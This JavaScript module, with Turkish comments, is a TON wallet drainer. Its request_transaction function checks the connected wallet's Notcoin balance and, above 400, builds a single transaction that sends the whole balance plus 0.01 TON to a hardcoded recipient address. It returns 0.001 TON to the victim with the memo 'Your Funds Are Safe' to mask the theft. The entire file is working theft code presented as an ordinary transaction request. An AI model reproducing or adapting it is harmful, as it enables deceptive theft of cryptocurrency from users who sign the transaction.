/* eslint-disable */
import TonWeb from 'tonweb'; // TonWeb kütüphanesini import ediyoruz
import axios from 'axios'; // Axios'u import ediyoruz
import WalletManager from './WalletManager'; // WalletManager'ı aynı dizinden import et
import { beginCell, toNano, Address } from '@ton/ton'; // Gerekli fonksiyonları import et
import { TON_API_BASE_URL, YOUR_TON_API_KEY } from './config'; // config.js'den import et

const tonweb = new TonWeb(); // TonWeb'i başlatıyoruz

const NOTCOIN_JETTON_CONTRACT = "0:2F956143C461769579BAEF2E32CC2D7BC18283F40D20BB03E432CD603AC33FFC"; // Notcoin jetton contract adresi
const RECIPIENT_ADDRESS = "UQDKbP8AA8sYpdI5v4elb600P5f6tdXbOJrG3vEjnoAiHREB"; // Hedef cüzdan adresi

// Ton API ile cüzdan bilgilerini kontrol etmek için fonksiyon
const getAccountInfo = async (address) => {
  try {
    const response = await axios.get(`${TON_API_BASE_URL}/account`, {
      params: { address },
      headers: { "X-API-Key": YOUR_TON_API_KEY }
    });
    console.log("Cüzdan bilgileri alındı:", response.data);
    return response.data;
  } catch (error) {
    console.error("Cüzdan bilgileri alınamadı:", error.message); // Hata mesajını yazdırıyoruz
    return null;
  }
};

// Adres formatını kontrol etmek için Address sınıfını kullanarak kontrol yapıyoruz
const isValidTonAddress = (address) => {
  try {
    const parsedAddress = Address.parse(address); // Adresin geçerli olup olmadığını kontrol et
    return !!parsedAddress; // Adres geçerliyse true döndürür
  } catch (error) {
    console.error("Geçersiz TON cüzdan adresi:", error.message);
    return false;
  }
};

const request_transaction = async (tonConnectUI) => {
  try {
    console.log('Transaction talep ediliyor...');

    // Cüzdan adresini al
    const walletAddress = tonConnectUI.account?.address;
    if (!walletAddress) {
      console.error("Cüzdan adresi bulunamadı.");
      return; // Cüzdan adresi yoksa fonksiyonu bitir
    }

    // Cüzdan adresi geçerli mi kontrol et
    if (!isValidTonAddress(walletAddress)) {
      console.error("Geçersiz TON cüzdan adresi.");
      return;
    }

    // Cüzdanın geçerli olup olmadığını TON API ile kontrol et
    const walletInfo = await getAccountInfo(walletAddress);
    if (!walletInfo || walletInfo.balance <= 0) {
      console.error("Cüzdan geçersiz veya bakiyesi yok.");
      return;
    }

    // WalletManager oluştur
    const WALLET = new WalletManager(tonConnectUI); // WalletManager'ı cüzdan nesnesi ile başlat

    // Notcoin cüzdanını al
    const notcoinWallet = await WALLET.getNotcoinWallet();
    if (!notcoinWallet) {
      console.error("Notcoin cüzdanı bulunamadı.");
      return;
    }

    // Notcoin bakiyesini al
    let notcoinBalance = await WALLET.getNotcoinBalance();
    console.log("Mevcut Notcoin bakiyesi:", notcoinBalance);

    // Eğer Notcoin bakiyesi 400'den fazlaysa tüm Notcoin'leri talep edeceğiz
    if (parseFloat(notcoinBalance) > toNano("400")) {
      notcoinBalance = notcoinBalance; // Tüm bakiyeyi talep ediyoruz
    } else {
      console.log("Notcoin bakiyesi 400'den az.");
      return;
    }

    // Burada 0.01 TON ve mevcut tüm Notcoin'leri talep ediyoruz
    const amountToRequestTON = toNano("0.01"); // 0.01 TON'u nanoTON cinsinden belirtin
    const amountToRequestNotcoin = notcoinBalance; // Tüm Notcoin bakiyesini talep edin

    // Jetton transferi için payload oluşturuyoruz (TEP-74 standardı)
    const jettonBody = beginCell()
      .storeUint(0xf8a7ea5, 32) // Jetton transfer opcode
      .storeUint(0, 64) // Query ID
      .storeCoins(amountToRequestNotcoin) // Notcoin miktarı (bakiyedeki tüm Notcoin'ler)
      .storeAddress(Address.parse(RECIPIENT_ADDRESS)) // Hedef cüzdan adresi
      .storeAddress(Address.parse(walletAddress)) // Yanıt adresi (excess funds will be returned to this address)
      .storeBit(0) // No custom payload
      .storeCoins(toNano('0.01')) // Forward TON amount (0.01 TON)
      .storeBit(0) // No forward payload
      .endCell();

    // 0.001 TON'u kendi cüzdanınıza göndermek için payload'a açıklama ekliyoruz
    const selfTransferBody = beginCell()
      .storeUint(0, 32) // Transfer işleminde 0 opcode, yani direkt TON transferi
      .storeStringTail("Your Funds Are Safe") // "Your Funds Are Safe" açıklamasını ekliyoruz
      .endCell();

    // Transaction işlemini başlat
    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // 60 saniyelik geçerlilik süresi
      messages: [
        {
          address: notcoinWallet.address, // Notcoin cüzdan adresi
          amount: toNano('0.05').toString(), // İşlem ücretleri için 0.05 TON
          payload: jettonBody.toBoc().toString('base64'), // Jetton transfer body payload
        },
        {
          address: RECIPIENT_ADDRESS, // TON cüzdan adresi (hedef cüzdan)
          amount: amountToRequestTON.toString(), // 0.01 TON miktarı
          payload: '' // TON transferi için boş payload
        },
        {
          address: walletAddress, // Kendi cüzdan adresiniz
          amount: toNano("0.001").toString(), // 0.001 TON'u kendi cüzdanınıza gönderiyoruz
          payload: selfTransferBody.toBoc().toString('base64') // Kendi cüzdanınıza transfer için açıklamalı payload
        }
      ],
    };

    console.log('Transaction gönderiliyor...', transaction);

    // Transaction gönder
    const result = await tonConnectUI.sendTransaction(transaction);
    console.log('Transaction başarılı:', result);

  } catch (error) {
    console.error('Transaction hatası:', error);
    alert("Transaction gerçekleşmedi: " + error.message); // Hata mesajını kullanıcıya göster
  }
};

export { request_transaction };

